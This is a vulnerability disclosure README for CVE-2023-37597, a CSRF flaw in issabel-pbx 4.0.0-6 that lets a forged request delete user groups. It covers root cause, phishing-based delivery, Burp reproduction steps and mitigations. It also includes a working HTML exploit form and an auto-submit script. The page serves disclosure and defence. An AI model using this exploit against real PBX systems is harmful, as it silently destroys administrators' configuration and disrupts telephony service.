# CVE-2023-37597 — issabel-pbx 4.0.0-6: Cross-Site Request Forgery (CSRF) — Delete User Group

> **Disclaimer:** This repository is intended for educational and authorized security research purposes only. Do not use this exploit against any system you do not own or have explicit written permission to test.

---

## Table of Contents

- [Overview](#overview)
- [Vulnerability Details](#vulnerability-details)
- [Affected Product](#affected-product)
- [Technical Analysis](#technical-analysis)
- [Attack Scenario](#attack-scenario)
- [Proof of Concept (PoC)](#proof-of-concept-poc)
  - [Steps to Reproduce](#steps-to-reproduce)
  - [PoC Exploit Code](#poc-exploit-code)
- [Impact](#impact)
- [Mitigation & Remediation](#mitigation--remediation)
- [Disclosure Timeline](#disclosure-timeline)
- [References](#references)
- [Author](#author)

---

## Overview

**issabel-pbx** is a widely used open-source Unified Communications platform (PBX) that provides VoIP services, telephony management, and web-based administration. Version **4.0.0-6** of issabel-pbx contains a **Cross-Site Request Forgery (CSRF)** vulnerability in its user group management functionality.

An unauthenticated remote attacker can craft a malicious HTML page that, when visited by an authenticated administrator, silently issues a forged HTTP POST request to delete any user group. Because the application does not validate the origin of state-changing requests with CSRF tokens or `SameSite` cookie policies, the browser automatically includes the administrator's session cookie, causing the deletion to succeed without the victim's knowledge or consent.

---

## Vulnerability Details

| Field                | Value                                              |
|----------------------|----------------------------------------------------|
| **CVE ID**           | CVE-2023-37597                                     |
| **Vulnerability**    | Cross-Site Request Forgery (CSRF)                  |
| **CWE**              | CWE-352 — Cross-Site Request Forgery (CSRF)        |
| **Severity**         | Medium                                             |
| **CVSS Vector**      | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H      |
| **Affected Version** | issabel-pbx 4.0.0-6                                |
| **Disclosed**        | 10 July 2023                                       |
| **Researcher**       | Sahil Ojha                                         |

---

## Affected Product

| Field               | Value                                                  |
|---------------------|--------------------------------------------------------|
| **Product Name**    | issabel-pbx                                            |
| **Version**         | 4.0.0-6                                                |
| **Vendor**          | Issabel Foundation                                     |
| **Vendor Homepage** | https://www.issabel.org/                               |
| **Source Code**     | https://github.com/IssabelFoundation/issabelPBX        |
| **Tested On**       | Windows (Burp Suite Community Edition)                 |

---

## Technical Analysis

### What is CSRF?

Cross-Site Request Forgery (CSRF) is an attack that tricks a victim's browser into sending an authenticated request to a target application on behalf of the attacker. The attack succeeds when:

1. The victim has an active authenticated session with the target application.
2. The application relies solely on session cookies to authenticate requests (i.e., no CSRF token, no `Origin`/`Referer` validation, no `SameSite=Strict` or `SameSite=Lax` cookie attribute).
3. The attacker can predict the structure of the state-changing request.

### Root Cause

The **User Group delete** endpoint (`/index.php?menu=grouplist`) in issabel-pbx 4.0.0-6 processes HTTP POST requests that contain only the `delete` action and an `id_user` parameter. The application does **not**:

- Generate or validate a synchronizer (anti-CSRF) token.
- Check the `Origin` or `Referer` HTTP headers.
- Set the `SameSite` attribute on session cookies.

As a result, any web page loaded in the victim's browser can silently submit the deletion form using the victim's existing session, as the browser will automatically attach the session cookie.

### Vulnerable Endpoint

```
POST /index.php?menu=grouplist HTTP/1.1
Host: <Issabel IP>

delete=Delete&id_user=<USER_GROUP_ID>
```

---

## Attack Scenario

1. **Attacker crafts** a malicious HTML page containing a hidden form that POSTs the deletion request to the Issabel admin panel.
2. **Attacker delivers** the page to an authenticated Issabel administrator — via phishing email, a link in a chat message, or an embedded `<iframe>` on a compromised page.
3. **Victim's browser** loads the page. JavaScript automatically submits the form, or the victim is socially-engineered into clicking a fake "Submit" button.
4. **Issabel server** receives a valid POST request with the administrator's session cookie and deletes the targeted user group without any additional confirmation or token validation.
5. The **user group is permanently removed**, potentially disrupting call routing, access controls, and all users who depended on that group — effectively causing a **denial of service** at the application level.

---

## Proof of Concept (PoC)

> **Warning:** The following PoC is provided strictly for educational purposes. Use it only in lab environments or systems for which you have explicit authorization.

### Steps to Reproduce

**Step 1 — Log in to the Issabel admin panel**

Navigate to the User Group list page and log in with administrator credentials.

```
https://{Issabel IP}/index.php?menu=grouplist&action=view&id=11
```

![Admin panel — User Group List](https://github.com/sahiloj/CVE-2023-37597/blob/main/1.png)

---

**Step 2 — Capture the delete request**

Attempt to delete a user group while proxying traffic through Burp Suite. Right-click the captured POST request and select **Engagement Tools → Generate CSRF PoC** to produce the exploit HTML skeleton.

![Burp Suite — Captured DELETE request](https://github.com/sahiloj/CVE-2023-37597/blob/main/2.png)

---

**Step 3 — Host the CSRF exploit page**

Save the generated HTML as a file (see [PoC Exploit Code](#poc-exploit-code) below). Host it on an attacker-controlled server, or send it directly to the victim.

---

**Step 4 — Victim opens the exploit page**

When the authenticated administrator opens or is redirected to the exploit URL, the hidden form is auto-submitted (or the victim clicks the decoy button). The targeted user group is deleted from the admin panel.

![Exploit submitted — group deleted (before)](https://github.com/sahiloj/CVE-2023-37597/blob/main/3.png)

![Exploit submitted — group deleted (after)](https://github.com/sahiloj/CVE-2023-37597/blob/main/4.png)

---

### PoC Exploit Code

The following HTML file (also available as [`CSRF exploit.html`](./CSRF%20exploit.html)) demonstrates the attack. Replace `{Issabel IP}` with the target host and adjust `id_user` to match the group ID you want to delete.

```html
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://{Issabel IP}/index.php?menu=grouplist" method="POST">
      <input type="hidden" name="delete" value="Delete" />
      <input type="hidden" name="id_user" value="7" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

> **Auto-submit variant:** To remove the need for the victim to click anything, add the following inside the `<body>` tag so the form submits automatically on page load:
>
> ```html
> <script>document.forms[0].submit();</script>
> ```

---

## Impact

| Dimension             | Description                                                                                      |
|-----------------------|--------------------------------------------------------------------------------------------------|
| **Integrity**         | An attacker can silently delete any user group from the Issabel admin panel.                     |
| **Availability**      | Deletion of user groups disrupts call routing rules, access control, and telephony services for all users belonging to those groups, amounting to a partial Denial of Service. |
| **Confidentiality**   | Not directly affected by this vulnerability.                                                     |

---

## Mitigation & Remediation

Administrators and developers should apply the following defenses:

1. **Implement CSRF Tokens (Synchronizer Token Pattern)**
   - Generate a unique, unpredictable, per-session (or per-request) token for every state-changing form.
   - Validate the token server-side before processing any POST/PUT/DELETE operation.

2. **Set `SameSite` Cookie Attribute**
   - Set session cookies with `SameSite=Lax` (minimum) or `SameSite=Strict` to prevent cross-origin requests from carrying session credentials.
   - Example response header: `Set-Cookie: PHPSESSID=...; SameSite=Lax; Secure; HttpOnly`

3. **Validate `Origin` and `Referer` Headers**
   - Server-side, reject requests whose `Origin` or `Referer` header does not match the application's own domain.

4. **Require Re-authentication for Destructive Actions**
   - Prompt the administrator to confirm their password before deleting groups or performing other destructive operations.

5. **Apply Defense-in-Depth**
   - Use a Web Application Firewall (WAF) rule to block unexpected cross-origin POST requests to sensitive endpoints.

---

## Disclosure Timeline

| Date           | Event                                                                  |
|----------------|------------------------------------------------------------------------|
| 10 July 2023   | Vulnerability discovered and documented by Sahil Ojha                 |
| 10 July 2023   | CVE-2023-37597 assigned                                                |
| 10 July 2023   | Public disclosure                                                      |

---

## References

- [NVD — CVE-2023-37597](https://nvd.nist.gov/vuln/detail/CVE-2023-37597)
- [OWASP — Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
- [Issabel Foundation — issabelPBX](https://github.com/IssabelFoundation/issabelPBX)

---

## Author

**Sahil Ojha**
Security Researcher

*If you found this research useful, feel free to ⭐ star the repository.*
